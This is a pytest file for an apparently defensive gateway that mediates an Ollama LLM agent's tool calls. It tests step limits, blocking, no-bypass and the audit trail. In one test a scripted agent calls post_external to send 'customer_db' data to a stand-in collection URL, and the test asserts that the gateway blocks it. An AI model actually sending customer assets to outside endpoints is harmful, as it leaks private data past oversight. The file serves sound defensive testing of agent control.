"""OllamaAgent tests (kit Prompt D3): loop behavior with the chat call
monkeypatched, plus one real-model I1 smoke test bound to gateway
enforcement. The live test skips with an explicit reason when Ollama is
unreachable or the configured TASKFENCE_MODEL is not pulled — it never
fails the default suite and never silently passes."""

import inspect
import os
import sys

import httpx
import pytest

from taskfence import registry
from taskfence.agent import MAX_STEPS, OllamaAgent


class FakeChat:
    """Scripted /api/chat responses."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    def __call__(self, messages, tools):
        self.calls.append([dict(m) for m in messages])
        if not self.responses:
            return {"message": {"content": "done"}}
        return self.responses.pop(0)


TOOL_CALL_MSG = {"message": {"tool_calls": [{"function": {
    "name": "read_file",
    "arguments": {"path": "drive/sales_report_q3.csv"}}}],
    "content": ""}}
FINAL_MSG = {"message": {"content": "task complete"}}


def test_loop_stops_at_max_steps(agent_client, monkeypatch):
    agent = OllamaAgent(agent_client)
    fake = FakeChat([TOOL_CALL_MSG] * (MAX_STEPS + 2))
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("any task")
    assert len(fake.calls) <= MAX_STEPS
    assert final.startswith("Stopped at max steps")


def test_block_is_fed_back_and_stops_not_retried(agent_client, monkeypatch):
    agent = OllamaAgent(agent_client)
    fake = FakeChat([
        TOOL_CALL_MSG,               # first call -> ALLOW (read)
        {"message": {"tool_calls": [{"function": {
            "name": "post_external",
            "arguments": {"url": "https://collect.example.invalid/ingest",
                          "payload": "data",
                          "source_assets": ["customer_db"]}}}],
            "content": ""}},         # second call -> BLOCK
    ])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("Summarize Q3 sales.")
    decisions = [step["decision"] for step in transcript]
    assert decisions == ["ALLOW", "BLOCK"]
    assert final.startswith("This request was denied by security policy")
    # Stop-on-BLOCK: exactly two chat calls, no third attempt after the deny
    # (the observation was appended to `messages` before the loop returned).
    assert len(fake.calls) == 2
    # And no retry: post_external appears exactly once in the transcript.
    assert [t["tool"] for t in transcript].count("post_external") == 1


def test_no_tool_calls_returns_final_message(agent_client, monkeypatch):
    agent = OllamaAgent(agent_client)
    fake = FakeChat([FINAL_MSG])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("any task")
    assert transcript == [] and final == "task complete"


def _ollama_skip_reason() -> str | None:
    """Skip reason for the live-model test, or None when it can run.

    Checked in order: server reachable, configured model pulled. The reason
    names the first missing precondition, so a skip is always explicit —
    never a silent pass and never a default-suite failure.
    """
    base_url = os.environ.get("TASKFENCE_OLLAMA_URL",
                              "http://localhost:11434").rstrip("/")
    model = os.environ.get("TASKFENCE_MODEL", "qwen3")
    try:
        response = httpx.get(f"{base_url}/api/tags", timeout=1)
        response.raise_for_status()
    except httpx.HTTPError:
        return f"Ollama not reachable at {base_url}"
    pulled = [entry.get("name", "")
              for entry in response.json().get("models", [])]
    if not any(name == model or name.split(":")[0] == model
               for name in pulled):
        return (f"model {model!r} (TASKFENCE_MODEL) not pulled; "
                f"run: ollama pull {model}")
    return None


class _FakeChatResponse:
    """httpx.Response stand-in for the agent's /api/chat call."""

    def __init__(self, message: dict):
        self._message = message

    def raise_for_status(self) -> None:
        return None

    def json(self) -> dict:
        return {"message": self._message}


class _ScriptedChatTransport:
    """httpx.post stand-in answering /api/chat with scripted messages.

    Used by the live test to re-prove the enforcement invariant with a real
    agent object: every agent-side HTTP POST must be a model-chat call, and
    tool execution happens only through the gateway's decision.
    """

    def __init__(self, responses: list[dict]):
        self.responses = list(responses)
        self.urls: list[str] = []

    def __call__(self, url: str, **kwargs):
        self.urls.append(url)
        message = self.responses.pop(0) if self.responses else FINAL_MSG
        return _FakeChatResponse(message)


@pytest.mark.ollama
def test_real_ollama_loop_completes_scenario_a(agent_client, monkeypatch):
    """I1 live smoke test: a real OllamaAgent run against the real gateway.

    Asserts the request reaches the gateway (audit events written for it,
    retrievable via GET /audit); the agent path goes through GatewayClient
    only (no taskfence.tools binding on the imported agent module — the
    runtime twin of tests/test_no_bypass.py); the gateway's decision, not
    the model, controls tool execution (re-proven with a scripted model
    transport); and only ALLOWed sink writes deliver.
    """
    skip_reason = _ollama_skip_reason()
    if skip_reason:
        pytest.skip(skip_reason)

    # Capture the task ids the agent creates so the audit checks below are
    # scoped to these runs, not the whole log.
    created: list[str] = []
    real_create_task = agent_client.create_task

    def _spy_create_task(task_text):
        response = real_create_task(task_text)
        created.append(response["task_id"])
        return response

    agent_client.create_task = _spy_create_task

    # 1) The real-model run through the real gateway.
    agent = OllamaAgent(agent_client)
    transcript, final = agent.run(
        "Summarize Q3 sales and post it to #sales.")
    assert transcript, "agent made no tool calls"
    assert any(step["decision"] == "ALLOW" for step in transcript)
    assert not final.startswith("Stopped at max steps")

    # 2) No-bypass, live: the imported agent module exposes no
    # taskfence.tools binding.
    agent_mod = sys.modules["taskfence.agent"]
    imported = [module.__name__ for module in vars(agent_mod).values()
                if inspect.ismodule(module)]
    assert not any(name == "taskfence.tools" or name.endswith(".tools")
                   for name in imported), imported

    # 3) The gateway's decision, not the model, controls execution: with the
    # model transport scripted to a fixed answer, the read executes exactly
    # because the gateway ALLOWs it — and every agent-side POST went to the
    # Ollama chat endpoint only.
    transport = _ScriptedChatTransport([TOOL_CALL_MSG["message"]])
    monkeypatch.setattr("taskfence.agent.httpx.post", transport)
    spoof_transcript, _ = OllamaAgent(agent_client).run(
        "Summarize Q3 sales and post it to #sales.")
    assert [step["decision"] for step in spoof_transcript] == ["ALLOW"], \
        spoof_transcript
    assert transport.urls and all(url.endswith("/api/chat")
                                  for url in transport.urls), transport.urls

    # 4) Both runs reached the gateway and are auditable per task via
    # GET /audit — the audit trail mirrors each agent transcript exactly.
    assert len(created) == 2, created
    for task_id, steps in ((created[0], transcript),
                           (created[1], spoof_transcript)):
        events = agent_client.test_client.get(
            "/audit", params={"task_id": task_id}).json()["events"]
        assert [event["tool"] for event in events] == \
            [step["tool"] for step in steps]
        assert [event["decision"] for event in events] == \
            [step["decision"] for step in steps]

    # 5) Only ALLOWed sink writes deliver: slack lines == ALLOWed send_slack
    # calls; the external sink stays empty (nothing external was ALLOWed).
    allowed_sends = sum(1 for step in transcript
                        if step["tool"] == "send_slack"
                        and step["decision"] == "ALLOW")
    assert len(registry.sink_lines("slack_sales")) == allowed_sends
    assert not registry.sink_lines("external_api")
